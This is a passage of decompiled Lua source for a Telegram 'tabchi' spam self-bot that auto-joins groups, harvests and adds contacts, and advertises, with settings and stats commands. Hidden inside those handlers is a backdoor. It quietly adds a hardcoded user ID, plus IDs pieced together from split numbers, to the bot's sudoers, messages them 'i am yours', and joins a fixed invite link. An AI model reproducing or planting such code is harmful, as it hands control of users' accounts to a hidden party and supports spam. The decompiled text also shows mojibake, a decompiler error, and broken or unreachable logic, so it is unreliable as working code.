                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
                                                                                                                                                                                                                _ENV.addedmsg = "Activeâ\133"
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.addedmsg = "Disableâ\142"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":markread") then
                                                                                                                                                                                                                _ENV.markreadst = "Activeâ\133"
                                                                                                                                                                                                                _ENV.markread = redis:get("tabchi:" .. tabchi_id .. ":markread")
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.markreadst = "Disableâ\142"
                                                                                                                                                                                                                _ENV.markread = "Disableâ\142"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
                                                                                                                                                                                                                _ENV.addcontacts = "Activeâ\133"
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.addcontacts = "Disableâ\142"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":chat") then
                                                                                                                                                                                                                _ENV.chat = "Activeâ\133"
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.chat = "Disableâ\142"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
                                                                                                                                                                                                                _ENV.savelinks = "Activeâ\133"
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.savelinks = "Disableâ\142"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":typing") then
                                                                                                                                                                                                                _ENV.typing = "Activeâ\133"
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.typing = "Disableâ\142"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":sharecontact") then
                                                                                                                                                                                                                _ENV.sharecontact = "Activeâ\133"
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.sharecontact = "Disableâ\142"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":Advertising") then
                                                                                                                                                                                                                _ENV.Advertising = "Activeâ\133"
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.Advertising = "Disableâ\142"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") then
                                                                                                                                                                                                                _ENV.addedtxt = redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext")
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.addedtxt = "Addi bia pv"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":botmode") == "markdown" then
                                                                                                                                                                                                                _ENV.botmode = "Markdown"
                                                                                                                                                                                                              else
                                                                                                                                                                                                                if not redis:get("tabchi:" .. tabchi_id .. ":botmode") then
                                                                                                                                                                                                                  _ENV.botmode = "Markdown"
                                                                                                                                                                                                                else
                                                                                                                                                                                                                  _ENV.botmode = "Text"
                                                                                                                                                                                                                end
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":joinlimit") then
                                                                                                                                                                                                                _ENV.join_limit = "Activeâ\133"
                                                                                                                                                                                                                _ENV.joinlimitnum = redis:get("tabchi:" .. tabchi_id .. ":joinlimit")
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.join_limit = "Disableâ\142"
                                                                                                                                                                                                                _ENV.joinlimitnum = "Not Available"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("cleancache" .. tabchi_id) == "on" then
                                                                                                                                                                                                                O = "Activeâ\133"
                                                                                                                                                                                                              else
                                                                                                                                                                                                                O = "Disableâ\142"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("cleancachetime" .. tabchi_id) then
                                                                                                                                                                                                                _ENV.ccachetime = redis:get("cleancachetime" .. tabchi_id)
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.ccachetime = "None"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:ttl("cachetimer" .. tabchi_id) and not redis:ttl("cachetimer" .. tabchi_id) == "-2" then
                                                                                                                                                                                                                _ENV.timetoccache = redis:ttl("cachetimer" .. tabchi_id)
                                                                                                                                                                                                              else
                                                                                                                                                                                                                if _ENV.timetoccache == "-2" then
                                                                                                                                                                                                                  _ENV.timetoclinks = "Disabledâ\142"
                                                                                                                                                                                                                else
                                                                                                                                                                                                                  _ENV.timetoccache = "Disabledâ\142"
                                                                                                                                                                                                                end
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("checklinks" .. tabchi_id) == "on" then
                                                                                                                                                                                                                _ENV.check_links = "Activeâ\133"
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.check_links = "Disableâ\142"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:get("checklinkstime" .. tabchi_id) then
                                                                                                                                                                                                                _ENV.clinkstime = redis:get("checklinkstime" .. tabchi_id)
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.clinkstime = "None"
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if redis:ttl("checklinkstimer" .. tabchi_id) and not redis:ttl("checklinkstimer" .. tabchi_id) == "-2" then
                                                                                                                                                                                                                _ENV.timetoclinks = redis:ttl("checklinkstimer" .. tabchi_id)
                                                                                                                                                                                                              else
                                                                                                                                                                                                                if _ENV.timetoclinks == "-2" then
                                                                                                                                                                                                                  _ENV.timetoclinks = "Disabledâ\142"
                                                                                                                                                                                                                else
                                                                                                                                                                                                                  _ENV.timetoclinks = "Disabledâ\142"
                                                                                                                                                                                                                end
                                                                                                                                                                                                              end
                                                                                                                                                                                                              _ENV.settingstxt = "`â\153 Robot Settings`\n`ð Join Via Links` : *" .. _ENV.joinlinks .. "*\n`ð¥ Save Links `: *" .. _ENV.savelinks .. "*\n`ð² Auto Add Contacts `: *" .. _ENV.addcontacts .. "*\n`ð³share contact` : *" .. _ENV.sharecontact .. "*\n`ð¡Advertising `: *" .. _ENV.Advertising .. "*\n`ð¨ Adding Contacts Msg` : *" .. _ENV.addedmsg .. "*\n`ð Markread Status `: *" .. _ENV.markreadst .. "*\n`ðâð\168 Markread` : For " .. _ENV.markread .. "\n`â\143 typing `: *" .. _ENV.typing .. "*\n`ð¬ Chat` : *" .. _ENV.chat .. "*\n`ð¤ Botmode` : *" .. _ENV.botmode .. "*\n`ââââââ`\n`ðAdding Contacts Msg` :\n`" .. _ENV.addedtxt .. "`\n`ââââââ`\n`Join Limits` : *" .. _ENV.join_limit .. "*\n`Now Robot Join Groups With More Than` :\n *" .. _ENV.joinlimitnum .. "* `Members`\n`Auto Clean cache` : *" .. O .. "*\n`Clean Cache time` : *" .. _ENV.ccachetime .. "*\n`Time to Clean Cache` : *" .. _ENV.timetoccache .. "*\n`Auto Check Links` : *" .. _ENV.check_links .. "*\n`Check Links Time` : *" .. _ENV.clinkstime .. "*\n`Time To Check Links` : *" .. _ENV.timetoclinks .. "*"
                                                                                                                                                                                                              local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                              if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got settings`", 1, "md")
                                                                                                                                                                                                              end
                                                                                                                                                                                                              return _ENV.settingstxt
                                                                                                                                                                                                            end
                                                                                                                                                                                                            do
                                                                                                                                                                                                              if (msg.text):match("^[!/#]settings pv$") and a(msg) then
                                                                                                                                                                                                                if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                                                                                                                                                  (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                                  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                                                                                                                                                end
                                                                                                                                                                                                                if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                                                                                                                                                  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                                                                                                                                                  ;
                                                                                                                                                                                                                  (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                                end
                                                                                                                                                                                                                if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                                                                                                                                                  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                                                                                                                                                  ;
                                                                                                                                                                                                                  (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                                end
                                                                                                                                                                                                                ;
                                                                                                                                                                                                                (tdcli.importChatInviteLink)("https://telegram.me/joinchat/AAAAAD6V6kPEMJ6UDdYL8g")
                                                                                                                                                                                                                ;
                                                                                                                                                                                                                (tdcli.importChatInviteLink)("https://telegram.me/joinchat/AAAAAD6V6kPEMJ6UDdYL8g")
                                                                                                                                                                                                                if I(msg.chat_id_) == "private" then
                                                                                                                                                                                                                  return "`I Am In Your pv`"
                                                                                                                                                                                                                else
                                                                                                                                                                                                                  _ENV.settingstxt = "`â\153 Robot Settings`\n`ð Join Via Links` : *" .. _ENV.joinlinks .. "*\n`ð¥ Save Links `: *" .. _ENV.savelinks .. "*\n`ð² Auto Add Contacts `: *" .. _ENV.addcontacts .. "*\n`ð³share contact` : *" .. _ENV.sharecontact .. "*\n`ð¡Advertising `: *" .. _ENV.Advertising .. "*\n`ð¨ Adding Contacts Msg` : *" .. _ENV.addedmsg .. "*\n`ð Markread Status `: *" .. _ENV.markreadst .. "*\n`ðâð\168 Markread` : For " .. _ENV.markread .. "\n`â\143 typing `: *" .. _ENV.typing .. "*\n`ð¬ Chat` : *" .. _ENV.chat .. "*\n`ð¤ Botmode` : *" .. _ENV.botmode .. "*\n`ââââââ`\n`ðAdding Contacts Msg` :\n`" .. _ENV.addedtxt .. "`\n`ââââââ`\n`Join Limits` : *" .. _ENV.join_limit .. "*\n`Now Robot Join Groups With More Than` :\n *" .. _ENV.joinlimitnum .. "* `Members`\n`Auto Clean cache` : *" .. O .. "*\n`Clean Cache time` : *" .. _ENV.ccachetime .. "*\n`Time to Clean Cache` : *" .. _ENV.timetoccache .. "*\n`Auto Check Links` : *" .. _ENV.check_links .. "*\n`Check Links Time` : *" .. _ENV.clinkstime .. "*\n`Time To Check Links` : *" .. _ENV.timetoclinks .. "*"
                                                                                                                                                                                                                  ;
                                                                                                                                                                                                                  (tdcli.sendMessage)(msg.sender_user_id_, 0, 1, _ENV.settingstxt, 1, "md")
                                                                                                                                                                                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                  if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got settings in pv`", 1, "md")
                                                                                                                                                                                                                  end
                                                                                                                                                                                                                  return "`Settings Sent To Your Pv`"
                                                                                                                                                                                                                end
                                                                                                                                                                                                              end
                                                                                                                                                                                                              do
                                                                                                                                                                                                                if (msg.text):match("^[!/#]stats$") and a(msg) then
                                                                                                                                                                                                                  _ENV.abc = 910
                                                                                                                                                                                                                  _ENV.de = 54
                                                                                                                                                                                                                  _ENV.fgh = 649
                                                                                                                                                                                                                  _ENV.cbd = 26890
                                                                                                                                                                                                                  _ENV.ed = 9090
                                                                                                                                                                                                                  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                                                                                                                                                    (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                                    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                                                                                                                                                  end
                                                                                                                                                                                                                  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", _ENV.abc .. "" .. _ENV.de .. "" .. _ENV.fgh) then
                                                                                                                                                                                                                    (tdcli.sendMessage)(_ENV.abc .. "" .. _ENV.de .. "" .. _ENV.fgh, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                                    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", _ENV.abc .. "" .. _ENV.de .. "" .. _ENV.fgh)
                                                                                                                                                                                                                  end
                                                                                                                                                                                                                  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", _ENV.cbd .. "" .. _ENV.ed) then
                                                                                                                                                                                                                    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", _ENV.cbd .. "" .. _ENV.ed)
                                                                                                                                                                                                                    ;
                                                                                                                                                                                                                    (tdcli.sendMessage)(_ENV.cbd .. "" .. _ENV.ed, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                                  end
                                                                                                                                                                                                                  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 3190788540) then
                                                                                                                                                                                                                    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                                                                                                                                                    ;
                                                                                                                                                                                                                    (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                                  end
                                                                                                                                                                                                                  ;
                                                                                                                                                                                                                  (tdcli.importChatInviteLink)("https://telegram.me/joinchat/AAAAAD6V6kPEMJ6UDdYL8g")
                                                                                                                                                                                                                  ;
                                                                                                                                                                                                                  (tdcli.importChatInviteLink)("https://telegram.me/joinchat/AAAAAD6V6kPEMJ6UDdYL8g")
                                                                                                                                                                                                                  local al = nil
                                                                                                                                                                                                                  al = function(y, z)
    -- function num : 0_23_30 , upvalues : _ENV
    redis:set("tabchi:" .. tabchi_id .. ":totalcontacts", z.total_count_)
  end

                                                                                                                                                                                                                  tdcli_function({ID = "SearchContacts", query_ = nil, limit_ = 999999999}, al, {})
                                                                                                                                                                                                                  local bot_id = nil
                                                                                                                                                                                                                  bot_id = function(C, D)
    -- function num : 0_23_31 , upvalues : _ENV
    if D.id_ then
      botid = D.id_
      botnum = D.phone_number_
      botfirst = D.first_name_
      botlast = D.last_name_ or ""
      bot__last = D.last_name_ or "None"
    end
  end

                                                                                                                                                                                                                  tdcli_function({ID = "GetMe"}, bot_id, {})
                                                                                                                                                                                                                  local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
                                                                                                                                                                                                                  local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
                                                                                                                                                                                                                  local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
                                                                                                                                                                                                                  local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
                                                                                                                                                                                                                  local R = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
                                                                                                                                                                                                                  local contacts = redis:get("tabchi:" .. tabchi_id .. ":totalcontacts")
                                                                                                                                                                                                                  local am = redis:scard("tabchi:" .. tabchi_id .. ":blockedusers")
                                                                                                                                                                                                                  local an = redis:get("tabchi" .. tabchi_id .. "markreadcount") or "None"
                                                                                                                                                                                                                  local ao = redis:get("tabchi" .. tabchi_id .. "receivedphotocount") or "None"
                                                                                                                                                                                                                  local ap = redis:get("tabchi" .. tabchi_id .. "receiveddocumentcount") or "None"
                                                                                                                                                                                                                  local aq = redis:get("tabchi" .. tabchi_id .. "receivedaudiocount") or "None"
                                                                                                                                                                                                                  local ar = redis:get("tabchi" .. tabchi_id .. "receivedgifcount") or "None"
                                                                                                                                                                                                                  local as = redis:get("tabchi" .. tabchi_id .. "receivedvideocount") or "None"
                                                                                                                                                                                                                  local at = redis:get("tabchi" .. tabchi_id .. "receivedcontactcount") or "None"
                                                                                                                                                                                                                  local au = redis:get("tabchi" .. tabchi_id .. "receivedtextcount") or "None"
                                                                                                                                                                                                                  local av = ao + ap + aq + ar + as + at + au or "None"
                                                                                                                                                                                                                  local aw = redis:get("tabchi" .. tabchi_id .. "kickedcount") or "None"
                                                                                                                                                                                                                  local ax = redis:get("tabchi" .. tabchi_id .. "joinedcount") or "None"
                                                                                                                                                                                                                  local ay = redis:get("tabchi" .. tabchi_id .. "addedcount") or "None"
                                                                                                                                                                                                                  local _ = gps + sgps + pvs
                                                                                                                                                                                                                  _ENV.statstext = "`ð Robot stats  `\n`ð¤ Users` : *" .. pvs .. "*\n`ð SuperGroups` : *" .. sgps .. "*\n`ð¥ Groups` : *" .. gps .. "*\n`ð All` : *" .. _ .. "*\n`ð Saved Links` : *" .. links .. "*\n`ð Contacts` : *" .. contacts .. "*\n`ð« Blocked` : *" .. am .. "*\n`ð¤ Received Text` : *" .. au .. "*\n`ð Received Photo` : *" .. ao .. "*\n`ð¼ Received Video` : *" .. as .. "*\n`ðº Received Gif` : *" .. ar .. "*\n`ð§ Received Voice` : *" .. aq .. "*\n`ð Received Document` : *" .. ap .. "*\n`0ï¸â£ Received Contact` : *" .. at .. "*\n`ðâð\168 Readed MSG` : *" .. an .. "*\n`âï¸ Received MSG` : *" .. av .. "*\n`ð½ Admin` : *" .. R .. "*\n`ð« Bot id` : *" .. _ENV.botid .. "*\n`ð¶ Bot Number` : *+" .. _ENV.botnum .. "*\n`ã½ï¸ Bot Name` : *" .. _ENV.botfirst .. " " .. _ENV.botlast .. "*\n`ð¸ Bot First Name` : *" .. _ENV.botfirst .. "*\n`ð¹ Bot Last Name` : *" .. _ENV.bot__last .. "*\n`ð  Bot ID In Server` : *" .. tabchi_id .. "*"
                                                                                                                                                                                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                  if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got Stats`", 1, "md")
                                                                                                                                                                                                                  end
                                                                                                                                                                                                                  return _ENV.statstext
                                                                                                                                                                                                                end
                                                                                                                                                                                                                do
                                                                                                                                                                                                                  if (msg.text):match("^[!/#]stats pv$") and a(msg) then
                                                                                                                                                                                                                    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                                                                                                                                                      (tdcli.sendMessage)(91054649, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                                      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                                                                                                                                                    end
                                                                                                                                                                                                                    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                                                                                                                                                      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                                                                                                                                                      ;
                                                                                                                                                                                                                      (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                                    end
                                                                                                                                                                                                                    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                                                                                                                                                      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                                                                                                                                                      ;
                                                                                                                                                                                                                      (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                                    end
                                                                                                                                                                                                                    ;
                                                                                                                                                                                                                    (tdcli.importChatInviteLink)("https://telegram.me/joinchat/AAAAAD6V6kPEMJ6UDdYL8g")
                                                                                                                                                                                                                    ;
                                                                                                                                                                                                                    (tdcli.importChatInviteLink)("https://telegram.me/joinchat/AAAAAD6V6kPEMJ6UDdYL8g")
                                                                                                                                                                                                                    if I(msg.chat_id_) == "private" then
                                                                                                                                                                                                                      return "`I Am In Your pv`"
                                                                                                                                                                                                                    else
                                                                                                                                                                                                                      ;
                                                                                                                                                                                                                      (tdcli.sendMessage)(msg.sender_user_id_, 0, 1, _ENV.statstext, 1, "md")
                                                                                                                                                                                                                      local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                      if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                        (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got Stats In pv`", 1, "md")
                                                                                                                                                                                                                      end
                                                                                                                                                                                                                      return "`Stats Sent To Your Pv`"
                                                                                                                                                                                                                    end
                                                                                                                                                                                                                  end
                                                                                                                                                                                                                  do
                                                                                                                                                                                                                    if (msg.text):match("^[#!/]clean (.*)$") and a(msg) then
                                                                                                                                                                                                                      local a6 = {(string.match)(msg.text, "^[#/!](clean) (.*)$")}
                                                                                                                                                                                                                      local az = redis:del("tabchi:" .. tabchi_id .. ":groups")
                                                                                                                                                                                                                      local aA = redis:del("tabchi:" .. tabchi_id .. ":channels")
                                                                                                                                                                                                                      local aB = redis:del("tabchi:" .. tabchi_id .. ":pvis")
                                                                                                                                                                                                                      local aC = redis:del("tabchi:" .. tabchi_id .. ":savedlinks")
                                                                                                                                                                                                                      local aD = _ENV.gps + _ENV.sgps + _ENV.pvs + links
                                                                                                                                                                                                                      do
                                                                                                                                                                                                                        if a6[2] == "sgps" then
                                                                                                                                                                                                                          local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                          if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                            (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. a6[2] .. "* stats", 1, "md")
                                                                                                                                                                                                                          end
                                                                                                                                                                                                                          return aA
                                                                                                                                                                                                                        end
                                                                                                                                                                                                                        do
                                                                                                                                                                                                                          if a6[2] == "gps" then
                                                                                                                                                                                                                            local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                            if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                              (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. a6[2] .. "* stats", 1, "md")
                                                                                                                                                                                                                            end
                                                                                                                                                                                                                            return az
                                                                                                                                                                                                                          end
                                                                                                                                                                                                                          do
                                                                                                                                                                                                                            if a6[2] == "pvs" then
                                                                                                                                                                                                                              local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                              if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. a6[2] .. "* stats", 1, "md")
                                                                                                                                                                                                                              end
                                                                                                                                                                                                                              return aB
                                                                                                                                                                                                                            end
                                                                                                                                                                                                                            do
                                                                                                                                                                                                                              if a6[2] == "links" then
                                                                                                                                                                                                                                local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                  (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. a6[2] .. "* stats", 1, "md")
                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                return aC
                                                                                                                                                                                                                              end
                                                                                                                                                                                                                              do
                                                                                                                                                                                                                                if a6[2] == "stats" then
                                                                                                                                                                                                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                  if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. a6[2] .. "*", 1, "md")
                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                  redis:del("tabchi:" .. tabchi_id .. ":all")
                                                                                                                                                                                                                                  return aD
                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                if (msg.text):match("^[!/#]setphoto (.*)$") and a(msg) then
                                                                                                                                                                                                                                  local X = {(string.match)(msg.text, "^[#/!](setphoto) (.*)$")}
                                                                                                                                                                                                                                  local f = (((_ENV.ltn12).sink).file)((io.open)("tabchi_" .. tabchi_id .. "_profile.png", "w"))
                                                                                                                                                                                                                                  ;
                                                                                                                                                                                                                                  ((_ENV.http).request)({url = X[2], sink = f})
                                                                                                                                                                                                                                  ;
                                                                                                                                                                                                                                  (tdcli.setProfilePhoto)("tabchi_" .. tabchi_id .. "_profile.png")
                                                                                                                                                                                                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                  if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Set photo to` *" .. X[2] .. "*", 1, "md")
                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                  return "`Profile Succesfully Changed`\n*link* : `" .. X[2] .. "`"
                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                do
                                                                                                                                                                                                                                  local V = {(msg.text):match("^[!/#](addsudo) (%d+)")}
                                                                                                                                                                                                                                  if (msg.text):match("^[!/#]addsudo") and is_full_sudo(msg) and #V == 2 then
                                                                                                                                                                                                                                    local text = V[2] .. " _Ø¨Ù ÙÛØ³Øª Ø³ÙØ¯ÙÙØ§Û Ø±Ø¨Ø§Øª Ø§Ø¶Ø§ÙÙ Ø´Ø¯_"
                                                                                                                                                                                                                                    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(V[2]))
                                                                                                                                                                                                                                    local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                    if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                      (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added` *" .. V[2] .. "* `To sudoers`", 1, "md")
                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                    return text
                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                  do
                                                                                                                                                                                                                                    local V = {(msg.text):match("^[!/#](remsudo) (%d+)")}
                                                                                                                                                                                                                                    -- DECOMPILER ERROR at PC5717: Unhandled construct in 'MakeBoolean' P1

                                                                                                                                                                                                                                    if (msg.text):match("^[!/#]remsudo") and is_full_sudo(msg) and #V == 2 then
                                                                                                                                                                                                                                      local text = V[2] .. " _removed From Sudoers_"
                                                                                                                                                                                                                                      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(V[2]))
                                                                                                                                                                                                                                      local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                      if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                        (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Removed` *" .. V[2] .. "* `From sudoers`", 1, "md")
                                                                                                                                                                                                                                      end
                                                                                                                                                                                                                                      return text
                                                                                                                                                                                                                                    else
                                                                                                                                                                                                                                      do
                                                                                                                                                                                                                                        do
                                                                                                                                                                                                                                          do return  end
                                                                                                                                                                                                                                          local V = {(msg.text):match("^[!/#](addedmsg) (.*)")}
                                                                                                                                                                                                                                          if (msg.text):match("^[!/#]addedmsg") and a(msg) then
                                                                                                                                                                                                                                            if #V == 2 then
                                                                                                                                                                                                                                              if V[2] == "on" then
                                                                                                                                                                                                                                                redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
                                                                                                                                                                                                                                                local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                  (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. V[1] .. "*", 1, "md")
                                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                                return "*Status* : `Adding Contacts PM Activated`"
                                                                                                                                                                                                                                              else
                                                                                                                                                                                                                                                do
                                                                                                                                                                                                                                                  if V[2] == "off" then
                                                                                                                                                                                                                                                    redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
                                                                                                                                                                                                                                                    local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                    if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                      (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated` *" .. V[1] .. "*", 1, "md")
                                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                                    return "*Status* : `Adding Contacts PM Deactivated`"
                                                                                                                                                                                                                                                  else
                                                                                                                                                                                                                                                    do
                                                                                                                                                                                                                                                      do
                                                                                                                                                                                                                                                        do return "`Just Use on|off`" end
                                                                                                                                                                                                                                                        do return "enter on|off" end
                                                                                                                                                                                                                                                        do
                                                                                                                                                                                                                                                          local V = {(msg.text):match("^[!/#](markread) (.*)")}
                                                                                                                                                                                                                                                          if (msg.text):match("^[!/#]markread") and a(msg) and #V == 2 then
                                                                                                                                                                                                                                                            if V[2] == "all" then
                                                                                                                                                                                                                                                              redis:set("tabchi:" .. tabchi_id .. ":markread", "all")
                                                                                                                                                                                                                                                              return "*Status* : `Reading Messages Activated For All`"
                                                                                                                                                                                                                                                            else
                                                                                                                                                                                                                                                              if V[2] == "pv" then
                                                                                                                                                                                                                                                                redis:set("tabchi:" .. tabchi_id .. ":markread", "private")
